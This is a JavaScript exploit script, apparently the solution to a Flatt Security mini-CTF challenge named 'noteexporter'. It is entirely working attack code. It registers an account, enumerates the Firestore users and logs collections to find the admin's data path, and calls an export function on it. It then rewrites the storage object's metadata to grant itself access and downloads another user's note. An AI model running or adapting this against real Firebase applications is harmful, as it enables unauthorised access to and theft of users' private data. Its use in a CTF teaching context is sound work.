
(async () => {
  const load = (url) =>
    new Promise((resolve) => {
      const script = document.createElement("script");
      script.setAttribute("src", url);
      script.onload = resolve;
      document.body.appendChild(script);
    });
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js");
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-auth-compat.js");
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-functions-compat.js");
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-storage-compat.js");
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore-compat.js");

  firebase.initializeApp({
    apiKey: "AIzaSyA6ZhkUxhETcdKM-pysxLB4-cwqWX2zSLc",
    authDomain: "flatt-minictf-noteexporter.firebaseapp.com",
    projectId: "flatt-minictf-noteexporter",
    storageBucket: "flatt-minictf-noteexporter.appspot.com",
    messagingSenderId: "633093587264",
    appId: "1:633093587264:web:f016da1dbe6eaf1f8cbaa5"
  });

  await firebase.auth().createUserWithEmailAndPassword('exploit@flatt.tech', 'flattsecurity');
  await firebase.auth().signInWithEmailAndPassword('exploit@flatt.tech', 'flattsecurity');
  const myUserId = firebase.auth().currentUser.uid;

  let adminUserId = "";
  const usersSnapshot = await firebase.firestore().collection('users').get();
  usersSnapshot.docs.forEach(doc => {
    if (doc.data().email === 'admin@flatt.tech') {
      adminUserId = doc.id;
    }
  });

  let targetPath = "";
  const logsSnapshot = await firebase.firestore().collection('logs').get();
  logsSnapshot.docs.forEach(doc => {
    if (doc.data().path.includes(adminUserId)) {
      targetPath = doc.data().path;
    }
  });

  const res = await firebase.functions().httpsCallable('exportNote')({
    path: targetPath,
  });
  
  const storageRef = firebase.storage().ref().child(res.data.storagePath);
  await storageRef.updateMetadata({
    customMetadata: {
      allowedUserId: myUserId,
    },
  });
  const downloadUrl = await storageRef.getDownloadURL();
  window.open(downloadUrl);
})();
